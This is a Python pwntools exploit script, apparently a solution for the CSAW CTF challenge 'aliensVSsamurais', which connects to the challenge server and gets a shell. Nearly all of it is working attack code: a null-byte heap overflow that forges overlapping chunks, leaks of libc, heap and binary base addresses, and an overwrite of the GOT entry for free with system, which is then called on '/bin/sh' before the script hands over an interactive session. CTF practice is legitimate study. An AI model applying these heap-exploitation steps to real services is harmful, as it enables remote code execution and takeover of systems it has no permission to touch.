'''
Null byte overflow to get RCE. Probably the unintended solution and an overkill.
'''

from pwn import *
import re

def alloc_s(payload="a"*7):
    r.sendlineafter("ka?\n", "1")
    r.sendafter("name?\n", payload)

def delete_s(index):
    r.sendlineafter("ka?\n", "2")
    r.sendlineafter("daimyo?\n", str(index))

def exit_s():
    r.sendlineafter("ka?\n", "3")

def alloc_a(size, payload):
    r.sendlineafter('Brood mother, what tasks do we have today.\n','1')
    r.sendlineafter('How long is my name?\n',str(size))
    r.sendafter('What is my name?\n',payload)

def show_a(index):
    r.sendlineafter('Brood mother, what tasks do we have today.\n','3')
    r.sendlineafter('Brood mother, which one of my babies would you like to rename?\n',str(index))
    rcvd = r.recvline()
    got = re.findall(ur'you like to rename (.+?) to?', rcvd)[0]
    #log.info("alien: {}".format(got))
    r.sendline("a")
    return got

def rename_a(index, payload):
    r.sendlineafter('Brood mother, what tasks do we have today.\n','3')
    r.sendlineafter('Brood mother, which one of my babies would you like to rename?\n',str(index))
    r.sendafter('to?', payload)

def delete_a(index):
    r.sendlineafter('Brood mother, what tasks do we have today.\n','2')
    r.sendlineafter('Which alien is unsatisfactory, brood mother?\n',str(index))

#r = process(['./ubuntu-xenial-amd64-libc6-ld-2.23.so', './aliensVSsamurais'], env={"LD_PRELOAD":"./libc-2.23.so"})
r = remote("pwn.chal.csaw.io", 9004)
libc = ELF('./libc-2.23.so')
alloc_s()
alloc_s()
alloc_s()
alloc_s()
alloc_s()

delete_s(0)
delete_s(1)
delete_s(2)
delete_s(3)

exit_s()
alloc_a(0xf0,'A' * 0xf0)#sb1
alloc_a(0x70,'B' * 0x70)#fb1
alloc_a(0xf0,'C' * 0xf0)#sb2
alloc_a(0x30,'D' * 0x30)#fb2 

delete_a(0)
delete_a(1)
# null byte heap overflow
# prev_size = 0x180
# prev_in_use = 0
alloc_a(0x78,'E' * 0x70 + p64(0x180))

# first fastbin gets overlapped
delete_a(2)

alloc_a(0xf0,'F' * 0xf0)
#gdb.attach(r)

# libc leak
l = show_a(4)
rename_a(4, l)

libc_base = u64(l + "\x00" * 2) - libc.symbols['__malloc_hook'] - 0x68
log.info("libc : " + hex(libc_base))

# fastbin Attack
# get the 0x280 byte chunk
delete_a(5)

alloc_a(0x80, "G" * 0x80)
alloc_a(0x60, 'H' * 0x60)
alloc_a(0x40, 'I' * 0x40)

#leak elf
l = show_a(4)
heap_base = u64(l + "\x00" * 2) - 0x15f0
rename_a(4, p64(heap_base + 0x14b0))
log.info("heap_base: 0x{:x}".format(heap_base))
#gdb.attach(r)

l = show_a(8)
rename_a(8, l)
elf_base = u64(l + "\x00" * 2) - 0x202720
log.info("elf_base: 0x{:x}".format(elf_base))

# getting got address on heap
l = show_a(4)
got_free = elf_base + 0x202018
rename_a(4, p64(got_free))

# overwriting got value
l = show_a(8)
rename_a(8, p64(libc_base + libc.symbols['system'])[:-1])
# passing parameter to system (free)
alloc_a(100, "/bin/sh")
delete_a(9)

r.interactive()
